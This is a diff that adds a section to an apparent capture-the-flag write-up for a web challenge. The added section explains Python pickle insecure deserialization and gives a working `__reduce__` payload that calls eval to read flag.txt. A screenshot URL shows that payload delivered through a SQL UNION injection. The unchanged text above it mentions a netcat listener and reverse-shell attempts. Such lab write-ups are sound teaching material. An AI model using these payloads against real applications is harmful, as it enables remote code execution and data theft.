@@ -111,3 +111,34 @@ print(base64.b64encode(pickle.dumps(RCE())).decode())
 After ensuring that the test container can run each individual command and connect back to my controlled server, I proceeded to put it to the test. I started a netcat server using the command `nc -lnvp 4444`. This would allow the application to connect to my server and accept commands.
 
 Unfortunately, despite confirming that each individual command worked within the container, the application failed to connect to the server. I tried various reverse shell payloads from the following resource: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md. While the Python payloads functioned within my test environment, they were ineffective in exploiting the actual application.
+
+## Exploitation 3 - Code Evaluation via Insecure Deserialization *(Success)*
+To provide further clarification on the `__reduce__` exploit, it's important to understand that `pickle` utilizes its return values in constructing the deserialized object. The initial return value is a callable, and the second is a `tuple` intended to serve as the arguments for the callable. In the typical scenario, it would resemble something like this:
+
+```py
+def __reduce__(self):
+    return self.__class__, (self.arg_1, self.arg_2,)
+```
+
+With this understanding, I can leverage the `eval` function to access the flag and generate a dictionary that the application can then render.
+
+```
+class RCE:
+    def __init__(self, payload):
+        self.payload = payload
+
+    def __reduce__(self):
+        return (eval, (self.payload,))
+
+item = RCE("{'name': open('flag.txt', 'r').read()}")
+
+print(base64.b64encode(pickle.dumps(item)).decode())
+```
+
+As evident, I've only included the `name` property in the return. To be candid, I'm taking a bit of a shortcut here by not specifying the other properties. I'm hoping that the application won't crash due to these missing details. The final step involves testing the payload against the application.
+
+![localhost_1337_view_%27%20UNION%20SELECT%20%27gASVQgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwmeyduYW1lJzogb3BlbignZmxhZy50eHQnLCAncicpLnJlYWQoKX2UhZRSlC4%3D](https://github.com/patzj/HTB-Challenges-Web-COP/assets/10325457/f7c8a486-69e3-4cb4-8870-3c2f418b2578)
+
+After validating it in a controlled environment, testing the payload against the live application also yields positive results. Flag successfully captured!
+
+## Post-Exploitation
